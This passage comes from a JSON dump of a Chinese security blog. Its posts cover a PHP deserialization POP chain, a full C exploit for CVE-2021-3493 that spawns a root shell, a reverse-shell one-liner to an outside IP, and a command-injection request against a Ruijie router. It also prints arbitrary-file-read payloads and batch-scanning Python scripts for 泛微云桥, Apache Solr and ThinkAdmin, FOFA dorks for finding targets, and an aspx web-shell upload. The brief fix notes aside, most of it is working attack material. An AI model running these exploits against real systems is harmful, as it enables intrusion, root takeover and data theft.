run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$c = new Jack();$c-&gt;action = $b; 其实这里不用 action 其实也是可以的，随便一个名字都行，但是这里用 action 是因为等下需要，因为我们需要利用这个 action，那么就是接下来怎么触发这个 Jack 类了，源码中只有一个 unserialize，而要想触发这一系列的类，只有 Titanic 类符合开始的条件，因为只有 Titanic 类的__destruct 魔法函数触发，所以这就是我们序列化的入口，__destruct 当对象所在函数调用完毕后执行。最后就是用 Titanic 类将这些类都连接在一起 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$s = new Titanic();$s-&gt;people = new Jack();$s-&gt;ship = new Love();$s-&gt;ship-&gt;var = new Rose();echo urlencode(serialize($s));echo &quot;&lt;br&gt;&quot;; 最后将序列化后得到的数据输入源码中即可 注释掉那个 md5 与 sha1 绕过我就不讲了，如果有师傅感兴趣可以参考 https://blog.csdn.net/LYJ20010728/article/details/114493052 # 结束语 哈哈哈，下次一定好好更新，下次一定 本次主要是讲了 php 反序列中常用魔术方法怎么触发以及怎么构造 pop 链，在实战中有的漏洞就是通过源码审计反序列化来导致 RCE 的，比如 thinkphp5.1.* 就存在一个 RCE 的 pop 链，这个我之后也会进行更新，构造 pop 链就是需要耐心也细心，一开始都不容易，我个人使用的是逆推的方法，就是从最后的命令执行往前推，需要啥就找啥，有的师傅是习惯从头到尾，我比较菜，只能从后面慢慢测试慢慢往前推，最后感谢关注我的朋友们，我会更加努力学习，尽量帮师傅们更快掌握一些知识，以后会尽量更新文章，谢谢师傅们！","path":"2021/06/30/PHP-反序列化（超细的）/","date":"06-30","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"}]},{"title":"CVE-2021-3493 Ubuntu提权","text":"# CVE-2021-3493 Ubuntu 提权 # CVE-2021-3493 Ubutnu 一些版本存在本地用户提权至 root 权限。漏洞是 Linux 内核中 overlayfs 文件系统中的 Ubuntu 特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于 Ubuntu 附带了一个允许非特权的 overlayfs 挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。 # 影响版本 Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM # 漏洞复现 测试环境： Ubuntu 16.04 LTS gcc 环境 poc 文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;sched.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;//#include &lt;attr/xattr.h&gt;//#include &lt;sys/xattr.h&gt;int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);#define DIR_BASE &quot;./ovlcap&quot;#define DIR_WORK DIR_BASE &quot;/work&quot;#define DIR_LOWER DIR_BASE &quot;/lower&quot;#define DIR_UPPER DIR_BASE &quot;/upper&quot;#define DIR_MERGE DIR_BASE &quot;/merge&quot;#define BIN_MERGE DIR_MERGE &quot;/magic&quot;#define BIN_UPPER DIR_UPPER &quot;/magic&quot;static void xmkdir(const char *path, mode_t mode)&#123; if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST) err(1, &quot;mkdir %s&quot;, path);&#125;static void xwritefile(const char *path, const char *data)&#123; int fd = open(path, O_WRONLY); if (fd == -1) err(1, &quot;open %s&quot;, path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, &quot;write %s&quot;, path); close(fd);&#125;static void xcopyfile(const char *src, const char *dst, mode_t mode)&#123; int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, &quot;open %s&quot;, src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, &quot;open %s&quot;, dst); char buf[4096]; ssize_t rd, wr; for (;;) &#123; rd = read(fi, buf, sizeof(buf)); if (rd == 0) &#123; break; &#125; else if (rd == -1) &#123; if (errno == EINTR) continue; err(1, &quot;read %s&quot;, src); &#125; char *p = buf; while (rd &gt; 0) &#123; wr = write(fo, p, rd); if (wr == -1) &#123; if (errno == EINTR) continue; err(1, &quot;write %s&quot;, dst); &#125; p += wr; rd -= wr; &#125; &#125; close(fi); close(fo);&#125;static int exploit()&#123; char buf[4096]; sprintf(buf, &quot;rm -rf &#x27;%s/&#x27;&quot;, DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, &quot;unshare&quot;); xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;); sprintf(buf, &quot;0 %d 1&quot;, uid); xwritefile(&quot;/proc/self/uid_map&quot;, buf); sprintf(buf, &quot;0 %d 1&quot;, gid); xwritefile(&quot;/proc/self/gid_map&quot;, buf); sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1) err(1, &quot;mount %s&quot;, DIR_MERGE); // all+ep char cap[] = &quot;\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00&quot;; xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777); if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1) err(1, &quot;setxattr %s&quot;, BIN_MERGE); return 0;&#125;int main(int argc, char *argv[])&#123; if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123; setuid(0); setgid(0); execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL); err(1, &quot;execl /bin/bash&quot;); &#125; pid_t child = fork(); if (child == -1) err(1, &quot;fork&quot;); if (child == 0) &#123; _exit(exploit()); &#125; else &#123; waitpid(child, NULL, 0); &#125; execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL); err(1, &quot;execl %s&quot;, BIN_UPPER);&#125; 漏洞利用 123gcc exploit.c -o exploitchmod +x exploit.&#x2F;exploit # 普通可登录用户测试 # www 不可登录用户测试 为了方便测试我直接使用了宝塔搭建了 web 环境，模拟当我们拿到 www 权限时提权过程 假如你通过某种方式上传了木马文件，可以使用蚁剑连接，将 exp 文件放在一个可读写的目录下，即权限为 777 因为蚁剑的虚拟终端只是 webshell，并非我们所需的 shell，所以我们可以先反弹一个 bash 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.30.5&#x2F;3344 0&gt;&amp;1 kali 监听，然后使用 Ubuntu 反弹 shell www 提权测试 123gcc exploit.c -o exploitchmod +x exploit.&#x2F;exploit 尝试使用了阿里云的服务器测试，测试失败，因为内核已经升级 # 防御建议 更新系统内核版本。详细版本信息请参考供应商的安全公告。","path":"2021/04/23/CVE-2021-3493-Ubuntu提权/","date":"04-23","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"https://spaceman-911.gitee.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"CNVD-2021-09650 锐捷NBR路由器 EWEB网管系统 远程命令执行","text":"# CNVD-2021-09650 锐捷 NBR 路由器 EWEB 网管系统 远程命令执行 # 漏洞简介 锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等网络设备产品及解决方案的专业化网络厂商。 锐捷网络 EWEB 网管系统存在远程命令执行漏洞。 # 影响版本 锐捷 NBR 路由器 EWEB 网管系统 版本 &lt; 2018 可能 # 资产收集 FOFA： 123title&#x3D;&quot;锐捷网络-EWEB网管系统&quot;icon_hash&#x3D;&quot;-692947551&quot; # 漏洞复现 post 传输 123&#x2F;guest_auth&#x2F;guestIsUp.phpmac&#x3D;1&amp;ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt; 566.txt 查看 passwd 写入 566.txt 中 访问 566.txt 这个权限是 root 权限 # 漏洞分析 漏洞的文件在 /guest_auth/guestIsUp.php 12345678910111213141516&lt;?php //查询用户是否上线了 $userip = @$_POST[&#x27;ip&#x27;]; $usermac = @$_POST[&#x27;mac&#x27;]; if (!$userip || !$usermac) &#123; exit; &#125; /* 判断该用户是否已经放行 */ $cmd = &#x27;/sbin/app_auth_hook.elf -f &#x27; . $userip; $res = exec($cmd, $out, $status); /* 如果已经上线成功 */ if (strstr($out[0], &quot;status:1&quot;)) &#123; echo &#x27;true&#x27;; &#125;?&gt; 这里没有任何过滤，直接将添加 ip 然后执行 exec，可直接命令拼接注入，从而形成远程命令执行","path":"2021/03/31/CNVD-2021-09650-锐捷NBR路由器-EWEB网管系统-远程命令执行/","date":"03-31","excerpt":"","tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CNVD","slug":"CNVD","permalink":"https://spaceman-911.gitee.io/tags/CNVD/"}]},{"title":"泛微云桥-任意文件读取","text":"# 泛微云桥 - 任意文件读取 # 漏洞简介 泛微云桥（e-Bridge）是上海泛微公司在” 互联网 +” 的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 # 影响版本 2018-2019 多个版本 # 资产查找 FOFA： 1&quot;泛微云桥&quot; # 漏洞复现 windows 为例 例如想读取 C:/Windows/win.ini 文件 访问 /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt 获取文件 id 读取文件 /file/fileNoLogin/上面获取到的id 当然可以进行目录读取，我们只需将 downloadUrl 参数更换为绝对路径目录即可 /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt 目录读取： /file/fileNoLogin/cb25f92f19954e99903c610d96c6b7fa 自写垃圾检测 1234567891011121314151617181920212223242526272829import requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)requests.packages.urllib3.disable_warnings()def run(url): w_poc1 = &#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt&#x27; try: r = requests.get(url+w_poc1,verify=False,timeout=5) except Exception as e: print (url,&#x27; 无法连接&#x27;) return 0 if &#x27;msg&#x27; in r.text: r = requests.get(url+w_poc1,verify=False,timeout=5).json()[&quot;msg&quot;] if r == &#x27;无法验证您的身份！&#x27;: print (url,&#x27; 安全&#x27;) elif &#x27;语法不正确&#x27; in r: l_poc1 = &#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt&#x27; r = requests.get(url+l_poc1,verify=False,timeout=6).json()[&quot;id&quot;] if r != &#x27;&#x27;: print (url,&#x27; 系统为linux 存在漏洞！！！！！&#x27;) elif &#x27;id&#x27; in r.text: print (url,&#x27; 系统为windows 存在漏洞！！！！！&#x27;) else: print (url,&#x27; 未知错误&#x27;)# ip后面的斜杠不要，正确ip:http://127.0.0.1url = input(&#x27;Url &gt;&gt;&gt; &#x27;)run(url) 批量检测，不知道是没有找到原因，还是我脚本写的不对的原因，没有找到 linux 系统的 # 修复建议 0x01 关闭程序路由 /file/fileNoLogin 0x02 升级版本","path":"2021/03/28/泛微云桥-任意文件读取/","date":"03-28","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"Apache Solr 任意文件读取漏洞","text":"# Apache Solr 任意文件读取漏洞 # 漏洞简介 Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。 # 影响版本 全版本（&gt;=8.8） # 资产查找 FOFA： 1app&#x3D;&quot;Solr&quot; # 漏洞复现 访问： /solr/admin/cores?indexInfo=false&amp;wt=json 再发送 post 请求 /solr/ 之后填写的是刚刚我们上面获取到的 status name 1234567891011POST &#x2F;solr&#x2F;panda_goods&#x2F;config HTTP&#x2F;1.1Host: ip:8983User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 82&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125; 出现 &quot;This response format is experimental. It is likely to change in the future.&quot; 表示存在漏洞 最后可以进行文件读取了 123456789101112POST &#x2F;solr&#x2F;panda_goods&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: ip:8983User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 29Content-Type: application&#x2F;x-www-form-urlencodedstream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd poc（by peiqi） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport sysimport randomimport reimport base64import timefrom lxml import etreeimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarningdef title(): print(&#x27;+------------------------------------------&#x27;) print(&#x27;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m&#x27;) print(&#x27;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m&#x27;) print(&#x27;+ \\033[34m公众号 : PeiQi文库 \\033[0m&#x27;) print(&#x27;+ \\033[34mVersion: Apache Solr &lt; 8.2.0 \\033[0m&#x27;) print(&#x27;+ \\033[36m使用格式: python3 CVE-2019-0193.py \\033[0m&#x27;) print(&#x27;+ \\033[36mUrl &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983 \\033[0m&#x27;) print(&#x27;+ \\033[36mFile &gt;&gt;&gt; 文件名称或目录 \\033[0m&#x27;) print(&#x27;+------------------------------------------&#x27;)def POC_1(target_url): core_url = target_url + &quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot; try: response = requests.request(&quot;GET&quot;, url=core_url, timeout=10) core_name = list(json.loads(response.text)[&quot;status&quot;])[0] print(&quot;\\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;/solr/&quot; + core_name + &quot;/config\\033[0m&quot;) return core_name except: print(&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;) sys.exit(0)def POC_2(target_url, core_name): vuln_url = target_url + &quot;/solr/&quot; + core_name + &quot;/config&quot; headers = &#123; &quot;Content-type&quot;:&quot;application/json&quot; &#125; data = &#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27; try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(&quot;\\033[36m[o] 正在准备文件读取...... \\033[0m&quot;.format(target_url)) if &quot;This&quot; in response.text and response.status_code == 200: print(&quot;\\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \\033[0m&quot;.format(target_url)) else: print(&quot;\\033[31m[x] 目标 &#123;&#125; 不存在漏洞\\033[0m&quot;.format(target_url)) sys.exit(0) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)def POC_3(target_url, core_name, File_name): vuln_url = target_url + &quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;.format(core_name) headers = &#123; &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; &#125; data = &#x27;stream.url=file://&#123;&#125;&#x27;.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if &quot;No such file or directory&quot; in response.text: print(&quot;\\033[31m[x] 读取&#123;&#125;失败 \\033[0m&quot;.format(File_name)) else: print(&quot;\\033[36m[o] 响应为:\\n&#123;&#125; \\033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;])) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)if __name__ == &#x27;__main__&#x27;: title() target_url = str(input(&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;)) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(&quot;\\033[35mFile &gt;&gt;&gt; \\033[0m&quot;)) POC_3(target_url, core_name, File_name) 批量，将 url 写入 1.txt 文件，存在漏洞则自动存入 url.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import requestsimport sysimport randomimport reimport base64import timefrom lxml import etreeimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarninga=[]def title(): print(&#x27;+------------------------------------------&#x27;) print(&#x27;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m&#x27;) print(&#x27;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m&#x27;) print(&#x27;+ \\033[34m公众号 : PeiQi文库 \\033[0m&#x27;) print(&#x27;+ \\033[34mVersion: Apache Solr &lt; 8.2.0 \\033[0m&#x27;) print(&#x27;+ \\033[36m使用格式: python3 poc.py \\033[0m&#x27;) print(&#x27;+ \\033[36mUrl &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983 \\033[0m&#x27;) print(&#x27;+ \\033[36mFile &gt;&gt;&gt; 文件名称或目录 \\033[0m&#x27;) print(&#x27;+------------------------------------------&#x27;)def POC_1(target_url): core_url = target_url + &quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot; try: response = requests.request(&quot;GET&quot;, url=core_url, timeout=2) core_name = list(json.loads(response.text)[&quot;status&quot;])[0] print(&quot;\\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;/solr/&quot; + core_name + &quot;/config\\033[0m&quot;) return core_name except: print(&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;) return 1def POC_2(target_url, core_name): vuln_url = target_url + &quot;/solr/&quot; + core_name + &quot;/config&quot; headers = &#123; &quot;Content-type&quot;:&quot;application/json&quot; &#125; data = &#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27; try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(&quot;\\033[36m[o] 正在准备文件读取...... \\033[0m&quot;.format(target_url)) if &quot;This&quot; in response.text and response.status_code == 200: print(&quot;\\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \\033[0m&quot;.format(target_url)) else: print(&quot;\\033[31m[x] 目标 &#123;&#125; 不存在漏洞\\033[0m&quot;.format(target_url)) return 1 except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)def POC_3(target_url, core_name, File_name): vuln_url = target_url + &quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;.format(core_name) headers = &#123; &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; &#125; data = &#x27;stream.url=file://&#123;&#125;&#x27;.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if &quot;No such file or directory&quot; in response.text: print(&quot;\\033[31m[x] 读取&#123;&#125;失败 \\033[0m&quot;.format(File_name)) print(response.text) else: if &#x27;root&#x27; in response.text: print(target_url) with open(&#x27;./url.txt&#x27;,&#x27;a&#x27;) as f: f.write(target_url+&#x27;\\n&#x27;) print(&quot;\\033[36m[o] 响应为:\\n&#123;&#125; \\033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;])) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)if __name__ == &#x27;__main__&#x27;: title() with open(&#x27;1.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: g=f.read() a=re.findall(&#x27;\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[:]\\d+&#x27;,g) print(a) for i in a: if &#x27;http&#x27; in i: target_url = str(i) else: target_url = &#x27;http://&#x27;+str(i) print(target_url) core_name = POC_1(target_url) print(core_name) if str(core_name)==&#x27;1&#x27;: print(22) continue b=POC_2(target_url, core_name) if str(b)==&#x27;1&#x27;: continue File_name = str(&#x27;/etc/passwd&#x27;) POC_3(target_url, core_name, File_name) # 漏洞修复 由于目前官方不予修复该漏洞，暂无安全版本。 1231. 开启身份验证&#x2F;授权2. 配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问3. 禁止将Apache Solr放置在外网","path":"2021/03/27/Apache-Solr-任意文件读取漏洞/","date":"03-27","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"某媒体资源平台 权限绕过+文件上传 by 月球大师傅","text":"某媒体资源平台 权限绕过+文件上传 by 月球大师傅漏洞简介月球师傅发的某媒体资源平台 0day 资产收集 FOFA： 1&quot;&#x2F;Widget&#x2F;common&#x2F;Service&#x2F;CommonWidgetService.asmx&#x2F;Categorylist&quot; 漏洞复现注册一个用户： http://xxx.xxx.xxx/Module/SSO/SJS_Register.aspx 登录账号，访问：/Module/PersonalCenter/Default.aspx?user=566 垂直权限绕过：/Module/PersonalCenter/Default.aspx?user=admin 跳转至管理员后台界面： /SmartMobile/MobileIndex.aspx?uname=admin&amp;orgId=0 文件上传我没有测试成功，有个啥云waf，感兴趣的师傅可以去F12sec看看：http://www.0dayhack.net/index.php/1278/","path":"2021/03/27/某媒体资源平台-权限绕过-文件上传-by-月球大师傅/","date":"03-27","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"CVE-2020-25540 ThinkAdmin任意文件读取","text":"# CVE-2020-25540 ThinkAdmin 任意文件读取 # 漏洞简介 ThinkAdmin 是一套基于 ThinkPHP 框架的通用后台管理系统 ，ThinkAdmin6 版本存在路径遍历漏洞。该漏洞主要是因为 api 中存在危险函数，没有任何过滤。攻击者可利用该漏洞通过请求编码参数任意读取远程服务器上的任意文件。 # 资产收集 FOFA： 1app&#x3D;&quot;ThinkAdmin&quot; # 漏洞复现 Poc 12345678910111213POST &#x2F;admin.html?s&#x3D;admin&#x2F;api.Update&#x2F;node HTTP&#x2F;1.1Host: ipUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko&#x2F;20100101 Firefox&#x2F;86.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: think_lang&#x3D;zh-cn; PHPSESSID&#x3D;ba4d233a6abc8a5a999e9a1d0917634cUpgrade-Insecure-Requests: 1Content-Length: 21Content-Type: application&#x2F;x-www-form-urlencodedrules&#x3D;%5B%22%2F%22%5D 自写的垃圾检测脚本 123456789101112131415import requestsimport urllib3url = input(&quot;url &gt;&gt;&gt; &quot;)try: data = &#123;&quot;rules&quot;:&quot;[\\&quot;/\\&quot;]&quot;&#125; requests.packages.urllib3.disable_warnings() res = requests.post(url+&#x27;/admin.html?s=admin/api.Update/node&#x27;,data=data,verify=False,timeout=6).text if &#x27;/404.html&#x27; in res: print(&#x27;&#123;&#125; 存在漏洞!!!!!&#x27;.format(url)) # print (res) else: print(&#x27;&#123;&#125; 安全!&#x27;.format(url))except: print(&#x27;&#123;&#125; 无法访问!&#x27;.format(url)) 批量检测如下： # 漏洞分析 源码：https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php Update.php 中的函数方法未授权执行，可直接调用，导致漏洞产生 # 漏洞修复 升级版本","path":"2021/03/27/CVE-2020-25540-ThinkAdmin任意文件读取/","date":"03-27","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"某数字化校园综合管理系统-文件上传getshell","text":"# 某数字化校园综合管理系统 - 文件上传 getshell # 漏洞简介 系统前台企业注册页面存在恶意文件上传漏洞 # 资产查找 FOFA： 1body&#x3D;&quot;DC_Login&#x2F;QYSignUp&quot; # 漏洞复现 点击企业注册 不存在这个链接可直接尝试访问 /DC_Login/QYSignUp 目录 选择上传附件，直接上传 aspx 一句话木马 1&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;nice!&quot;);%&gt; 成功上传 蚁剑连接 各位白帽子应严格遵守中华人民共和国相关法律法规 。","path":"2021/03/18/某数字化校园综合管理系统-文件上传getshell/","date":"03-18","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"CVE-2020-13942 Apache Unomi 远程代码执行漏洞","text":"# CVE-2020-13942 Apache Unomi 远程代码执行漏洞 # 漏洞简介 Apache Unomi 是一个 Java 开源客户数据平台，这是一个 Java 服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi 可用于在非常不同的系统（例如 CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。 在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码，漏洞对应编号为 CVE-2020-11975，而 CVE-2020-13942 漏洞是对 CVE-2020-11975 漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。 # 影响版本 Apache Unomi &lt; 1.5.2 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Unomi Welcome Page&quot; # 漏洞复现 post 数据包 payload，ping dnslog 12345678910111213141516171819202122232425POST /context.json HTTP/1.1Host: ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: 